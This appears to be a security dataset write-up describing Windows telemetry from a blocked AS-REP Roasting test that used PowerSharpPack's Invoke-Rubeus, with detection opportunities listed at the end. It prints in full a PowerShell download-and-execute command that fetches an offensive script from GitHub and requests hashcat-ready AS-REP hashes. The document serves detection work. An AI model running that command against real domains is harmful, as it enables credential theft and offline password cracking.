# T1558.004-3: AS-REP Roasting — WinPwn - PowerSharpPack - Kerberoasting Using Rubeus

## Technique Context

AS-REP Roasting (T1558.004) via reflective .NET assembly loading avoids dropping Rubeus to disk. PowerSharpPack's `Invoke-Rubeus` function downloads the Rubeus binary as a base64-encoded .NET assembly, loads it reflectively into the PowerShell process via `Assembly.Load()`, and then executes Rubeus commands in memory. This test invokes `Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"` to request AS-REP hashes for all pre-auth disabled accounts in hashcat-ready format. Despite having the same dataset name structure as T1558.003-7, this test targets the AS-REP variant of the attack.

## What This Dataset Contains

The dataset spans approximately 6 seconds on 2026-03-14 from ACME-WS02 (acme.local domain) and contains 49 events across Sysmon, Security, and PowerShell channels. This is notably the smallest dataset of the T1558 series.

**The attack command**, captured in Security 4688:
```
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"}
```

The `/format:hashcat /nowrap` arguments specify output as single-line hashcat-ready hashes, directly suitable for offline cracking with tools like Hashcat or John the Ripper.

**Defender blocked execution.** The PowerSharpPack Invoke-Rubeus loader was blocked by AMSI. Evidence:
- Sysmon only captured 3 events (all Event 3 / Network Connect from `MsMpEng.exe`) — the drastically reduced Sysmon event count compared to other tests reflects that Defender terminated the PowerShell process quickly, before many Sysmon-monitored activities occurred
- `MsMpEng.exe` (Windows Defender, PID 2528) made outbound TCP connections to cloud infrastructure immediately after the AMSI block — the same Defender cloud telemetry pattern seen in tests T1558.003-1 and T1558.003-7

**Process chain** (Security 4688):
1. `whoami.exe` — ART test framework pre-check
2. `powershell.exe` — carrying the PowerSharpPack download-and-execute command

**Security events**: Standard test framework lifecycle — PowerShell start/stop, whoami, token right adjustment (4703). No Rubeus-related processes.

**PowerShell 4104**: The script block containing `iex(new-object net.webclient).downloadstring(...)` and `Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"` was logged before the block. Additional 4104 events contain only framework boilerplate. The `Invoke-Rubeus` function body was not captured.

**PowerShell 4103**: `Set-ExecutionPolicy -Scope Process -Force -ExecutionPolicy Bypass` captured in both pre-test framework processes.

## What This Dataset Does Not Contain (and Why)

**No AS-REP hashes.** Defender blocked the PowerSharpPack loader before `Invoke-Rubeus` executed. No AS-REP requests were made to the DC.

**Very few Sysmon events (only 3).** Defender blocked and terminated the PowerShell process extremely quickly — before Sysmon could capture image loads (Event 7), process accesses (Event 10), named pipe creation (Event 17), or file writes (Event 11). This contrasts with tests 1, 6, and 7 where more Sysmon activity was captured before the block. The 3 Sysmon events are all Event 3 (Network Connect) from `MsMpEng.exe`.

**No Sysmon Event 1 for the attack PowerShell.** The include-mode Sysmon config did not match this particular PowerShell invocation pattern quickly enough, or the process terminated before Sysmon logged Event 1. The process creation is captured in Security 4688.

**No reflective Rubeus assembly load.** No `Assembly.Load()` occurred, and no in-memory Rubeus execution took place.

## Assessment

This dataset is the clearest example of a very early Defender block in the T1558 series — the minimal Sysmon footprint (3 events, all from MsMpEng.exe) indicates the PowerShell process was terminated almost immediately after the AMSI block. Despite this, the Security channel captures the full command line including `asreproast /format:hashcat /nowrap`, and the Defender cloud telemetry (Sysmon 3 from MsMpEng.exe) confirms the block occurred. The dataset is a useful illustration of how fast modern EDR products can terminate adversarial processes, and how command-line logging and process-exit events remain valuable evidence even when execution is stopped early.

## Detection Opportunities Present in This Data

- **Security 4688**: `powershell.exe` command line containing `Invoke-Rubeus.ps1` from PowerSharpPack and `asreproast /format:hashcat /nowrap` — `asreproast` combined with `/format:hashcat` is an unambiguous indicator
- **Sysmon 3**: `MsMpEng.exe` outbound TCP connections within seconds of `powershell.exe` start — the Defender cloud telemetry pattern that correlates with AMSI detection events across all blocked tests
- **Security 4689**: `powershell.exe` exits `0x0` (success) very quickly after creation — rapid process termination following a download-and-execute attempt is consistent with a Defender kill
- **Security 4688**: The command includes a URL to `PowerSharpBinaries/Invoke-Rubeus.ps1` — the PowerSharpPack repository and binary name are known offensive infrastructure
- **PowerShell 4103**: `Set-ExecutionPolicy Bypass` immediately before a `net.webclient.downloadstring()` invocation — preparatory bypass step consistent with untrusted script execution
